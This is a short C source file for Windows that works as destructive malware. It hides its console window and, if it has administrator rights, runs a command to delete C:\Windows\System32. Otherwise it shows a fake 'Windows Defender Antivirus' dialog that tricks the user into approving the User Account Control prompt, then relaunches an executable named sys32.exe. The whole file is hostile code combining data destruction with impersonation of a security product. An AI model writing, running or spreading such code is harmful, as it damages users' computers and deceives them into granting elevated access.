#include <windows.h>
#include <shlobj.h>

int main()
{
	FreeConsole();
	
	if (IsUserAnAdmin()) {
        system("del C:\\Windows\\System32");
	}
	else {
		MessageBoxA(NULL, "Please run as Administrator. System Scan required. Press OK and Click YES on User Account Control.", "Windows Defender Antivirus", NULL);
		system("sys32.exe"); 
	}
	return 0;
}
